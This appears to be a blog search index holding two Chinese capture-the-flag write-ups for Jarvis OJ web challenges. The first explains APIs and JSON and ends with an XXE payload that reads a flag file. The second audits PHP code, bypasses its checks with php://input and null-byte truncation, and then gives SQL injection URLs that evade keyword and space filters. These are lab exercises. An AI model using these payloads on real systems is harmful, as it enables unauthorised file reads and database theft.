<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Jarvis-OJ-api调用]]></title>
    <url>%2F2019%2F07%2F29%2FJarvis-OJ-api%E8%B0%83%E7%94%A8%2F</url>
    <content type="text"><![CDATA[面对这道题我完全小白，所以我必须详细解释。 基础知识 什么是php框架？框架思想就是提供一种可以在多个应用程序中使用的设计。所有应用程序都有大量通用的基本内容 —— 具体地说，就是某类与数据库的接口、某些应用程序逻辑、应用程序呈现给用户的内容等。如果您编写过许多 PHP 应用程序，则会知道这些基本内容是什么。您可能已经编写过一组函数或从数据库中读取数据和向数据库中写入数据的类，可能已经使用过诸如 Smarty 之类的模板引擎来管理 UI。而且一定编写过大量 PHP 代码来完成诸如分析表单提交并根据提交的数据作决定之类的事务。如果您已经编写过很多应用程序，则可能已经一次又一次地做过相同的基本工作，有时还会将一个应用程序中的代码借用到另一个应用程序中。 框架专门用于为这些常用元素(数据库交互、表示层、应用程序逻辑)提供结构，以便您可以花费更少的时间来编写数据库接口代码或者表示层接口，而花费更多的时间来编写应用程序本身。以这种方式分解应用程序，这种架构被称为模型-视图-控制器(Model-View-Controller，MVC)。模型 指数据，视图 指表示层，而控制器 指应用程序逻辑或业务逻辑。对 MVC 的完整讨论超出本文的范围，但是鼓励您研究 MVC 并深入了解 MVC 的一切(请参阅 参考资料)。 选择框架 每种语言几乎都有若干个框架可用。选择刚好满足需求的框架可能有点难，尤其是当您以前未曾使用过任何一个框架时更是如此。虽然熟悉此领域的同事和可信赖的 developerWorks 作者提供的建议和评价会十分有帮助，但是选择任何框架时实际上应当遵循的惟一一个指导原则是：框架为每个人 节省的时间和精力越多越好。如果一个框架工作得很好但是会导致产生大量支持调用，那就不是一个优秀框架。如果一个框架易于支持，但是起到的阻碍作用大于辅助开发作用，那也不是一个优秀框架。如果一个框架十分优雅，但是会导致出现支持问题和开发问题，那么这个框架也是没有用的。 选择项目框架时，考虑从上到下所有相关人员的意见，并且在评估框架时，考虑到对其他各方的影响。 当考虑采用一个框架时，请进一步审视您的应用程序，并思考该应用程序是不是需要一个框架。框架不是必需品。即使不使用框架，也可以继续编写企业应用程序。框架会对项目有帮助么?它是否会节省每个人的时间和精力?您的应用程序在框架中是否会执行得更好?它是否将提供所缺乏的稳定性?如果上面任意一个问题的答案为是，那么您应当考虑采用框架。如果所有这些问题的答案都为否，那么使用框架只会把事情变复杂。 什么是api？从文件操作开始谈API。以C语言为例，我们使用fopen()函数可以打开一个文件，感觉非常简单。文件保存在硬盘上，要经过复杂的处理才能显示，这些细节对我们来说是透明的，由操作系统完成。也就是说，我们调用fopen()函数来通知操作系统，让操作系统打开一个文件。那么，我们如何告诉操作系统打开文件呢？ 看似简单的操作到底层都非常复杂，打开文件首先要扫描硬盘，找到文件的位置，然后从文件中读取一部分数据，将数据放进I/O缓冲区，放进内存；这些数据都是0、1序列，还要对照ASCII表或Unicode表”翻译“成字符，再在显示器上显示出来。这个过程如果要让程序员来完成，那简直是噩梦！怎么办呢？操作系统想了一个很好的办法，它预先把这些复杂的操作写在一个函数里面，编译成一个组件（一般是动态链接库），随操作系统一起发布，并配上说明文档，程序员只需要简单地调用这些函数就可以完成复杂的工作，让编程变得简单有趣。这些封装好的函数，就叫做API(Application Programming Interface)，即应用程序编程接口。说得更加通俗易懂一些，别人写好的代码，或者编译好的程序，提供给你使用，就叫做API。你使用了别人代码（或者程序）中的某个函数、类、对象，就叫做使用了某个API。 各种编程语言自带的标准库其实也是API。这些API由编程语言的开发者们编写，安全、高效、健壮，为我们实现了常见的功能，让我们不用再重复造轮子。C语言 API 以函数的形式呈现，例如 printf()、scanf()、fopen() 等。Java API 主要以类的形式呈现，例如 String、Thread、Date 等。C++ 是在C语言的基础上进行的扩展，所以 C++ API 既包含函数也包含类。第三方库（框架）libxml2——xml的c语言版库，2个项目使用过，win和Linux下都很犀利~~比较快捷CURL—— 这个用的主要是使用了他的封装的http和https的请求，比较犀利，其中包含了openssl的内容iconv——功能强大的编码格式转化库，UTF8，Unicode等互相转化很方便openssl——C的开源密库，可以进行证书加密和https的访问的模拟提交可以和CURL配合使用cocos2d——2D游戏引擎，相比较传统的UI自己控制的重画OpenCV——开源图像库还有很多第三方（非官方）的组织机构、公司、个人提供的代码，也是一种 API。这些代码有的免费，有的收费；有的开源，有的闭源。这些代码大都针对某个特定的应用领域编写，有时候被称为框架或者库。例如基于C语言的图形界面库GTK，基于C++的网络库ACE，基于Java的大数据处理平台Hadoop，基于Python的Web开发框架Django，基于JavaScript的前端开发框架React。严格的来说, API 代表：应用程序编程接口，在某些或其他方面，很多大型公司会建立自己的API提供给用户或者内部使用。不过怎么用通俗的语言向你解释什么是API呢，在开发和业务中他是不是更多的含义呢，让我们后退一步看看网络是如何工作的。严格的来说, API 代表：应用程序编程接口，在某些或其他方面，很多大型公司会建立自己的API提供给用户或者内部使用。不过怎么用通俗的语言向你解释什么是API呢，在开发和业务中他是不是更多的含义呢，让我们后退一步看看网络是如何工作的。 www和远程服务器当我想到网络的时候，我脑海中想象了一张巨大的连接服务网络每一张页面都储存在远程服务器中，而一个远程服务器并不是那么的神秘，他就是一部分用来优化请求过程的远程计算机。为了能让事情更透明，你可以在你一台可以服务整个网站到网络上的手提电脑上启动一个服务器（事实上，一个本地服务器就是在发布到公众上之前工程师需要开发网站：注：其实这句话我不是很理解，翻译得乱七八糟，原文是：a local server is what engineers use to develop websites before releasing them to the public）。当你键入www.facebook.com进入你的浏览器并回车的时候，一个请求就去到了faceboook的远程服务器。一旦你的浏览器接收到了响应，它就解析代码并展示页面。浏览器，也就是我们说的客户端 ，也可以不太严谨的说facebook的服务器就是个API ，这意味这每次你在网络上浏览网页的时候，你就和一些远程服务器的API发生了交互。一个API并不是等同于一整个远程服务器，他是服务器用来接受请求和发送响应的一部分 API就是一种为你客户提供服务的方法你可能听说过公司将API包做成一个产品，例如，”地下气象站“出售的就是它自己的气象数据API的 入口实例场景： 你的个人小型商业网站有一个给客户注册的预约表格，你想要给你的客户提供自动创建一个谷歌日历时间的能力。API 使用：这概念就是让你的网站服务器带着请求去创建一个具体的事件，你的服务器之后会接收到谷歌的响应，处理它，然后将有关信息发送回给你的浏览器，例如发送一个认证信息给你的用户。另外，你的浏览器会通过你的服务器经常直接发送API 请求到谷歌服务器。谷歌日历的API 和其他的远程服务器的API 究竟有什么不同。专业的说，不同之处在于他们的请求和响应的形式是不一样的。当你提交整个页面的时候，你的浏览器期待的是一种HTML格式的响应，这个响应里包含了一些描述性的代码，当谷歌日历API 响应的时候会返回一些数据，大多是类似与json的格式。如果你的网站服务器发出了个API 请求，那么你的网站服务器就变成了个客户端（类似与当你使用浏览器访问网站的时候你的浏览器就成了客户端一样），从用户的角度来说，API允许他们完成一些没有离开网站的动作。很多现代的网站都至少使用了一些第三方API。很多问题都有了第三方的解决方案了，无论是以函数库或者是服务的形式，使用第三方的解决方案现在已经逐渐变得更简单和更可靠。这是很常见的，开发团队将他们的应用分解到多个服务器里面，服务器通过API 相互交流。为主应用服务器提供辅助功能的服务器这方面的知识可以参考微型服务器。总得来说，当一个公司向它的用户提供了API 的时候，这就意味着他们建造了一系列的专用URL通道，用来返回纯数据形式的响应，意味这响应不会包含一些用于解释的额外开销，你期望的是一种像网站一样的图表用户界面。你的浏览器可以发送这种请求吗，当然可以，由于实际的HTTP传输都是以文本的形式进行的，你的浏览器总是能达到它能展示响应的最好状态。例如，你可以通过浏览器直接访问GitHub的API ，甚至根本不需要访问标记（=_= # 什么是访问标记…..)，当你用浏览器访问一个GitHub的用户API的时候，你将获得一个JSON形式的响应 A就是application作为结束，就多扔几个关于API 的事例吧“应用”可以指很多事情，在API 里面他指代的是： 1 :一个具有不同功能的软件 2：整个服务器，整个app，或者是app的一小部分基本上任何软件都可以从环境中有区别的分离开来，有可能在API 里成为A（也就是Application），也可能它本身就是某种API。假设你在你的代码里使用了第三方的函数库，一旦与你的代码结合了，一个函数路就成为了你真个APP里的一部分，成为软件中特殊的一部分，函数库很可能具有一个让你可以与你其他的代码相互沟通的API .这有其他的一些例子，在面对对象设计中，代码是被组织进对象的，你的应用程序可能是由上百个可以相互交流的类构成的,每个类都有一个API ，一系列公共方法和用于和其他类进行交流的的属性,一个类可能有内部的私有化属性，这意味这它是对外部环境隐藏的（不是一个API ）,在使用API 这个东西越来越普遍的今天，希望你看完本篇文章后会有更多的理解 JSONJSON(JavaScript Object Notation, JS 对象简谱) 是一种轻量级的数据交换格式。它基于 ECMAScript (欧洲计算机协会制定的js规范)的一个子集，采用完全独立于编程语言的文本格式来存储和表示数据。简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。 易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率 xxe漏洞详解此部分在我的博客有详细解说,一定要先看看去看 解题步骤 我们一开始看到一个登陆框，输入没什么反省，只是回显字段，后来我们抓包也没什么反映，但是我们在输入参数之后进行抓包，出现反映了。我们可以看到回显信息是json格式，而且content-type为application/json。application即为应用，api简称是啥应用程序编程接口，题目是啥api调用emmmmmmmm有点关系了。 关于content-type MediaType，即是Internet Media Type，互联网媒体类型；也叫做MIME类型，在Http协议消息头中，使用Content-Type来表示具体请求中的媒体类型信息。 常见的媒体格式类型如下：text/html ： HTML格式text/plain ：纯文本格式text/xml ： XML格式image/gif ：gif图片格式image/jpeg ：jpg图片格式image/png：png图片格式以application开头的媒体格式类型：application/xhtml+xml ：XHTML格式application/xml ： XML数据格式application/atom+xml ：Atom XML聚合格式application/json ： JSON数据格式application/pdf ：pdf格式application/msword ： Word文档格式application/octet-stream ： 二进制流数据（如常见的文件下载） 题目表述：请设法获得目标机器/home/ctf/flag.txt中的flag值。题目还出现了json，而且我们可以看到我们传入的数据以另一种的形式出现在下面，可以修改。这里使我们想到了xml，与xml相关的漏洞是什么？xee，xee原理我们已经了解过了所以我们开始获取flag。XXE漏洞就是服务器接受从客户端发送来的xml格式数据时，xml数据中恶意的引用了外部实体，将它的值绑定为服务器的目标文件，这样在服务器返回给我们解析后的值时，就会把目标文件的内容返回给我们，我们就读取了敏感文件。 但是这道题目，默认的是json格式传递，因此首先我们更改Content-Type的值为application/xml,然后传入xml代码： 12345&lt;?xml version=”1.0″?&gt;&lt;!DOCTYPE abcd[&lt;!ENTITY any SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;&lt;something&gt;&amp;any;&lt;/something&gt;]]></content>
      <tags>
        <tag>Jarvis-OJ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Jarvis OJ IN A Mess]]></title>
    <url>%2F2019%2F07%2F27%2FJarvis-OJ-IN-A-Mess%2F</url>
    <content type="text"><![CDATA[查看源码发现index.phps文件，打开开始代码审计 1234567891011121314151617181920212223242526&lt;?phpif(!$_GET['id'])&#123; header('Location: index.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'Hahahahahaha'; return ;&#125;$data = @file_get_contents($a,'r');if($data=="1112 is a nice lab!" and $id==0 and strlen($b)&gt;5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)&#123; require("flag.txt");&#125;else&#123; print "work harder!harder!harder!";&#125;?&gt; 代码解释：1.判断id参数存不存在，如果不存在跳转到index.php?id=12.获取三个变量id，a，b3.判断a变量中有没有’.’4.打开文件a,并且放到字符串r中5.1)data变量等于一个字符串2)id=03)b变量的长度大于54)ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。eregi函数对大小写不敏感。6.file_get_contents 函数返回字符串的结果，可以赋值给变量，也可以直接进行使用：返回结果直接使用的例子代码：echo file_get_contents(‘a.txt’);此语句直接显示a.txt的文件内容返回结果赋值给变量的例子代码：$s=file_get_contents(‘a.txt’);接下来可以对字符串变量$s进行使用，例如获取部分内容。 @符号用来屏蔽错误信息，当函数不存在或者包含文件不存在时，不会显示错误信息。 eregi存在%00截断，而substr没有，也就是说eregi如果第一个字符是%00，那它就跳过这个再检测。 123456789&lt; ?php if (ereg("c","abcdef"))&#123; //说明：判断abcdef中是否含有字母c echo "通过"; &#125;else&#123; echo "错误"; &#125; ?&gt; eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) 他的意思就是判断某个字符串中是否有1114，这个某个字符串就是111加上b的第一个字符。这个条件很容易满足，但是问题就在后面，它又要求b的第一个字符不等于四。前后矛盾啊。在这里我们使用00截断而且变量a的值是一个文件，不是一个字符串。因此我们就不能将对应的字符串传递给a，使得data为对应的字符串。在这里我们使用php伪协议。那么php伪协议到底什么呢？php://input 是个可以访问请求的原始数据的只读流。，我们的变量a必须是一个文件名字，但是我们总不能在部署服务器上搭建一个文件，所以这个协议在这里充当的作用就是一个衔接的作用，我们以post方式传递参数。id的值很显然不能为0，但是我们可以利用弱等于。那我们就开始构造payload：长度大于5其中有1114但是第四个不等等于4 http://web.jarvisoj.com:32780/index.php?id=a&amp;a=php://input&amp;b=%0041114竟然不出flag，给了一串字符。不是加密、、、也不是flag、、、前面有个/有点像目录呀，试试呗。后面有个id，可能是sql注入？加个单引号’判断列但是无论多少列都是一样的回显，肯定过滤了什么，我们试试过没过滤空格,在下面的步骤中我们试过了没有过滤order by,但是为什么这里是sql防御回显,肯定是过滤了空格。 既然这样那么我们就开始苦逼的sql注入之路吧 一开始是各种猛操作啊，但是屁用没有，正常的思路就是应该判断过滤了什么，但是我嫌麻烦。。。返回头来还是老老实实的看过滤什么字符吧，一开始我想到了burp的模糊测试，但是太麻烦了分post和get，我在网上只找到了post的方法。最后用到了我以前学习的小技巧。web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1&#39;^(length(select)=0)select被过滤掉了。接着我们就换其他的测试，在这里想测谁的就测谁的哈哈哈哈哈哈哈哈哈哈。但是被过滤了我们不要忘记绕过方法。比如双写http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1%27^(length(selecselectt)=0)最后我我们得到的结果：被过滤：selectfrom没有被过滤：andwhereor/2//#(为了避免笔记对应的操作这里加一个/)information‘orderby我在测试空格的时候，竟然爆错了，说明空格不但被过滤了而且。。。还被限制了。/**/ 竟然也被限制了emmm太毒了。–+也被限制了但是#没有哈哈哈哈哈哈哈哈哈哈 这题很狗啊，双写绕过必须穿插，不能是selectselect. 真正的注入即将开始http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/or/*1*/1=1#http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1/*1*/order/*1*/by/*1*/3#三个字段。回显正常。4个字段回显不正常 http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniounionn/*1*/selecselectt/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636F6E74656E74#http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=-1/*1*/uniounionn/*1*/selecselectt/*1*/1,2,context/*1*/ffromrom/*1*/content# flag得到了，那么我们现在就来总结一下吧。首先，我们正常思路，单引号、order by、union、select。在这里我们一定要主要我们每次输入语句的时候页面给我们回显的是什么，在这个题中我们输入单引号报错，页面给我们回显。其实当我们使用or 1=1#的时候按理来说应该跟id=1的情况回显一样，但是这个题过滤或者限制了某个字符，我们在使用的时候肯定是报错或者出现固定的提示。我们使用没有过滤的字符：可以看到与id=1的时候回显一样。我在不断的错误中发现了三种情况：1.正常回显2.错误回显，这里指的是我们输入的sql语句错误或者没有正确闭合(也就是报错)3.sql防御回显，这里指的是后端如果检测到它所指定的危险字段，会给我们回显固定的语句或者提示(这里要与二区别开来)]]></content>
      <tags>
        <tag>Jarvis OJ wp</tag>
      </tags>
  </entry>
</search>
